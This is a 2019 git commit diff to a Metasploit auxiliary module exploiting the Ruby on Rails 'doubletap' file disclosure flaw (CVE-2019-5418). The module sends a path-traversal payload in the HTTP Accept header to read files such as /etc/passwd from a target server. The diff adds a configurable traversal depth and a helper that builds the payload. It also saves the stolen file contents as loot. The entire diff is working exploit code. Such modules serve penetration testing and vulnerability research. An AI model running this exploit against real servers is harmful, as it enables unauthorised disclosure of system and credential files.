02671909e40da76fafae7707b4407bb0e06e0f4e
cbrnrd <cbawsome77@gmail.com>
2019-03-28 13:56:19 -0600

    Fix review things
    Add depth option, fix style things, add more references.

--- modules/auxiliary/gather/rails_doubletap_file_read.rb
+++ modules/auxiliary/gather/rails_doubletap_file_read.rb
@@ -10,7 +10,7 @@ class MetasploitModule < Msf::Auxiliary
     super(
       update_info(
         info,
-        'Name'        => 'Ruby On Rails File Content Disclosure (\'doubletap\')',
+        'Name'        => "Ruby On Rails File Content Disclosure ('doubletap')",
         'Description' => %q{
           This module uses a path traversal vulnerablity in Ruby on Rails
           versions =< 5.2.2 to read files on a target server.
@@ -25,7 +25,9 @@ class MetasploitModule < Msf::Auxiliary
           [ 'URL', 'https://hackerone.com/reports/473888' ],
           [ 'URL', 'https://github.com/mpgn/Rails-doubletap-RCE' ],
           [ 'URL', 'https://groups.google.com/forum/#!topic/rubyonrails-security/pFRKI96Sm8Q' ],
-          [ 'CVE', '2019-5418']
+          [ 'CVE', '2019-5418'],
+          ['EDB', '46585'],
+          ['AKA', 'doubletap']
         ]
       )
     )
@@ -33,20 +35,25 @@ class MetasploitModule < Msf::Auxiliary
     register_options(
       [
         Opt::RPORT(80),
-        OptString.new('ROUTE', [true, 'A route on the vulnerable server.', '/msf']),
+        OptString.new('ROUTE', [true, 'A route on the vulnerable server.', '/home']),
+        OptInt.new('DEPTH', [true, 'The depth of the traversal.', 10]),
         OptString.new('TARGET_FILE', [true, 'The absolute path of remote file to read.', '/etc/passwd'])
       ]
     )
 
     register_advanced_options(
       [
-        OptBool.new('SKIP_CHECK', [true, 'Skip the initial vulnerability check.', false])
+        OptBool.new('SkipCheck', [true, 'Skip the initial vulnerability check.', false])
       ]
     )
   end
 
+  def get_accept_header_value(depth, file)
+    return (('../'*depth) + file + '{{').gsub('//', '/')
+  end
+
   def check
-    return true if datastore['SKIP_CHECK']
+    return true if datastore['SkipCheck']
     # Check if target file is absolute path
     unless datastore['TARGET_FILE'][0] == '/'
       print_error "TARGET_FILE must be an absolute path (eg. /etc/passwd)."
@@ -57,7 +64,7 @@ class MetasploitModule < Msf::Auxiliary
     res = send_request_cgi({
       'method' => 'GET',
       'uri' => normalize_uri(datastore['ROUTE']),
-      'headers' => { 'Accept' => "../../../../../../../../../../etc/passwd{{"} # What is this, the 90s?
+      'headers' => { 'Accept' => get_accept_header_value(datastore['DEPTH'], '/etc/passwd')}
     })
 
     if res.nil?
@@ -85,7 +92,7 @@ class MetasploitModule < Msf::Auxiliary
     res = send_request_cgi({
       'method' => 'GET',
       'uri' => normalize_uri(datastore['ROUTE']),
-      'headers' => { 'Accept' => "../../../../../../../../../..#{datastore['TARGET_FILE']}{{"}
+      'headers' => { 'Accept' => get_accept_header_value(datastore['DEPTH'], datastore['TARGET_FILE'])}
     })
 
     if res.nil?
@@ -99,6 +106,7 @@ class MetasploitModule < Msf::Auxiliary
     else
       print_good 'Response from server:'
       print_line res.body.to_s
+      store_loot('rails.doubletap', 'text/plain', datastore['RHOSTS'], res.body.to_s, "rails_doubletap_read_file_#{Rex::Text.rand_text_alpha(8)}.txt", "File read via Rails DoubleTap exploit.")
     end
   end
 end
